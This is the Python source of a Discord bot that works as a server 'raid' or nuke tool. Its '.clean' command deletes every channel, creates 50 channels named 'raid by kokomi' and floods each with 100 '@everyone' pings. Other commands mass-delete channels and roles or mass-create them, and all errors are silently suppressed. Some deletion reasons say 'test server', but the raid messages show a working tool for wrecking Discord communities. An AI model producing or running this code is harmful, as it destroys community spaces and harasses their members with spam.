import discord
from discord.ext import commands
import asyncio

# intents bot
intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix=".", intents=intents)

# limit task
DELETE_LIMIT = 20
CREATE_LIMIT = 20
MESSAGE_LIMIT = 30

ROLE_DELETE_LIMIT = 15
ROLE_CREATE_LIMIT = 15
CHANNEL_CREATE_LIMIT = 20

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")

# clean
async def delete_channel(channel, sem):
    async with sem:
        try:
            await channel.delete(reason="Raid by Kokomi")
        except:
            pass

async def create_channel(guild, sem):
    async with sem:
        try:
            return await guild.create_text_channel("raid by kokomi")
        except:
            return None

async def send_messages(channel, sem):
    async with sem:
        try:
            for _ in range(100):
                await channel.send("@everyone Raid by kokomi")
        except:
            pass

@bot.command()
@commands.has_permissions(administrator=True)
async def clean(ctx):
    guild = ctx.guild

    delete_sem = asyncio.Semaphore(DELETE_LIMIT)
    await asyncio.gather(*[
        asyncio.create_task(delete_channel(ch, delete_sem))
        for ch in guild.channels
    ])

    create_sem = asyncio.Semaphore(CREATE_LIMIT)
    channels = await asyncio.gather(*[
        asyncio.create_task(create_channel(guild, create_sem))
        for _ in range(50)
    ])

    message_sem = asyncio.Semaphore(MESSAGE_LIMIT)
    await asyncio.gather(*[
        asyncio.create_task(send_messages(ch, message_sem))
        for ch in channels if ch
    ])

# del all channel
async def delete_any_channel(ch, sem):
    async with sem:
        try:
            await ch.delete(reason="Test server channel cleanup")
        except:
            pass

@bot.command()
@commands.has_permissions(administrator=True)
async def delchannel(ctx):
    guild = ctx.guild
    sem = asyncio.Semaphore(DELETE_LIMIT)

    normal_channels = [
        ch for ch in guild.channels
        if not isinstance(ch, discord.CategoryChannel)
    ]

    await asyncio.gather(*[
        asyncio.create_task(delete_any_channel(ch, sem))
        for ch in normal_channels
    ])

    await asyncio.gather(*[
        asyncio.create_task(delete_any_channel(cat, sem))
        for cat in guild.categories
    ])

# del role
async def delete_role(role, sem):
    async with sem:
        try:
            await role.delete(reason="Test server cleanup")
        except:
            pass

@bot.command()
@commands.has_permissions(administrator=True)
async def delrole(ctx):
    guild = ctx.guild
    bot_top_role = guild.me.top_role
    sem = asyncio.Semaphore(ROLE_DELETE_LIMIT)

    await asyncio.gather(*[
        asyncio.create_task(delete_role(role, sem))
        for role in guild.roles
        if role.name != "@everyone"
        and not role.managed
        and role < bot_top_role
    ])

# cre role
async def create_role(guild, name, sem):
    async with sem:
        try:
            await guild.create_role(
                name=name,
                reason="Test server role create"
            )
        except:
            pass

@bot.command()
@commands.has_permissions(administrator=True)
async def crerole(ctx, role_name: str = None, amount: int = None):
    if role_name is None:
        await ctx.send(
            "Thiếu biến số `role name`. Example: ```\n.crerole raid 20```"
        )
        return

    if amount is None:
        await ctx.send(
            "Thiếu biến số `amount`. Example: ```\n.crerole raid 20```"
        )
        return

    if amount <= 0:
        return

    sem = asyncio.Semaphore(ROLE_CREATE_LIMIT)
    await asyncio.gather(*[
        asyncio.create_task(create_role(ctx.guild, role_name, sem))
        for _ in range(amount)
    ])

# cre channel
async def create_text_channel(guild, name, sem):
    async with sem:
        try:
            await guild.create_text_channel(
                name=name,
                reason="Test server channel create"
            )
        except:
            pass

@bot.command()
@commands.has_permissions(administrator=True)
async def crechannel(ctx, name: str = None, amount: int = None):
    if name is None:
        await ctx.send(
            "Thiếu biến số `name`. Example: ```\n.crechannel raid 20```"
        )
        return

    if amount is None:
        await ctx.send(
            "Thiếu biến số `amount`. Example: ```\n.crechannel raid 20```"
        )
        return

    if amount <= 0:
        return

    sem = asyncio.Semaphore(CHANNEL_CREATE_LIMIT)
    await asyncio.gather(*[
        asyncio.create_task(create_text_channel(ctx.guild, name, sem))
        for _ in range(amount)
    ])

# SILENT ERROR
@clean.error
@delchannel.error
@delrole.error
@crerole.error
@crechannel.error
async def silent_error(ctx, error):
    pass

bot.run("TOKEN_BOT")
